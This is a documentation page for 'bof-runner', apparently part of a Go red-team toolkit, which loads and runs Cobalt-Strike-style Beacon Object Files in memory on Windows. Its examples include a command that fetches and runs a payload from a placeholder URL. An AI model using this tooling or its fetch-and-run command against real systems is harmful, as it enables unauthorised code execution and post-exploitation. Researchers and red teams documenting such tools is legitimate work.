# `bof-runner`

> Standalone runner for Beacon Object Files (CS-compatible COFF).

**Source:** [`cmd/bof-runner/`](https://github.com/oioio-space/maldev/tree/master/cmd/bof-runner) · **godoc:** [pkg.go.dev/…/cmd/bof-runner](https://pkg.go.dev/github.com/oioio-space/maldev/cmd/bof-runner)
**Audience:** operator + researcher · **Platforms:** Windows only

## Synopsis

```text
bof-runner -file <path.o>  [-arg-int N] [-arg-string S] [-arg-short N] [-arg-bytes <hex>]
bof-runner -url  <https://…>   [same args]
```

## What it does

Loads a Cobalt-Strike-style COFF object into the current process and runs its
`go` entrypoint. Arguments are packed in BeaconDataPack format and consumed by
the BOF via `BeaconDataInt` / `DataShort` / `DataExtract`. Validated against
the public BOF ecosystem (TrustedSec SA, Outflank, FortyNorth, CS community
kit). Constraints documented in
[`runtime/bof-loader`](../techniques/runtime/bof-loader.md#beacon-api-limitations).

## Build

```bash
GOOS=windows GOARCH=amd64 go build -o bof-runner.exe ./cmd/bof-runner
```

## Examples

```cmd
:: Run an enumeration BOF with two args (int + string)
bof-runner.exe -file whoami.o -arg-int 1 -arg-string "DOMAIN\user"

:: Fetch and run from a URL (research / sandbox use)
bof-runner.exe -url https://example.invalid/payload.o
```

## See also

- Technique: [`runtime/bof-loader`](../techniques/runtime/bof-loader.md).
- Glossary: [BOF](../glossary.md).
